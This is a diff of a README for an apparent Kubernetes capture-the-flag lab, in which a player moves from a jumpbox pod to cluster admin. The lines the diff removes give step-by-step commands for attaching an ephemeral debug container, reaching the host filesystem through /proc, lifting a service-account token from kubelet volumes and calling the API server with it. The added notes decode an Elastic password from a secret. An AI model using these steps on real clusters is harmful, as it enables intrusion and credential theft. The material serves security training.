@@ -1,65 +1,31 @@
-# Capture the Flag - TBD (ephemerial container to cluster admin)
+# Capture the Flag - Coastline Cluster Attacker
 
 ## Overview
 
-Compromised company - Coastline Data (CD)
+The player starts within a jumpbox (pod) with a DMZ namespace. From here the player must:
+* obtain access to the cluster
+* compromise the worker node
+* obtain cluster admin to access the master node
+
+### Learning Objectives
+* Learn how ephemeral containers work
+* Use common enumeration kubernetes techniques
+* Understand different methods for obtaining credentials
 
 ## Notes
 
-```bash
-gcloud container clusters create kgw-ctf2023-testing --enable-autoupgrade --num-nodes=2 --cluster-version=1.24.8-gke.2000
-```
+Deploying Elastic Search via Elastic Cloud on Kubernetes requires customisation for KubeSim. This includes:
 
-```bash
-gcloud container clusters get-credentials kgw-ctf2023-testing
-```
+* Restricting the Operator on the master-node (as it's highly permissive)
+* Creating a Storage Class and PV (local) for the PVC to attach to
+* Customising the Elastic Search resource with a volume claim template
 
-### Ephemeral Container Attachment
-
-```bash
-kubectl debug -it --attach=false -c debugger --image=ttl.sh/kctl-48fg-43fasf:6h $POD -n coastline
-```
-
-```bash
-kubectl attach -it -c debugger $POD -n coastline
-```
-
-
-### Elastic Search
-
-> took a minute and half for the operator to deploy ES
+Alongside this attaching a Fluentd daemonset requires access to the Elastic Cloud secret. This is located here:
 
 ```bash
 kubectl get secret coastline-es-elastic-user -o go-template='{{.data.elastic | base64decode}}'
 ```
 
-### TBD
+This secret is referenced as a environment variable in the daemonset
 
-* Remove master-0 from pv (done)
-* operator scheduled on node (done)
-* another deployment with sharepidnamespace false (done)
-* token request api (get list sa) (done)
-* couldn't get the sa to work so I've added access to service accounts and use their tokens (log)
-* change daemonset name for coastline (done)
 
-- apiGroups:
-  - authentication.k8s.io/v1
-  resources:
-  - serviceaccount/token
-  verbs:
-  - create
-
-/proc/18/root/host/var/lib/kubelet/
-
-## Step through
-
-kubectl get pods -n coastline
-export POD=data-burrow-dev-<uid>
-kubectl debug -it --attach=false -c debugger --image=<image> $POD -n coastline
-kubectl attach -it -c debugger $POD -n coastline
-#attached to pod
-cat /proc/<hydrelaps-pid>/root/host/root/flag.txt
-cd /proc/19/root/host/var/lib/kubelet/pods/<uid>/volumes/kubernetes.io~projected/kube-api-access-<uid>/
-export TOKEN=$(cat token)
-env #for api-server ip
-kubectl get pods -n kube-system --token=$TOKEN --server=https://<server-ip>:443 --insecure-skip-tls-verify
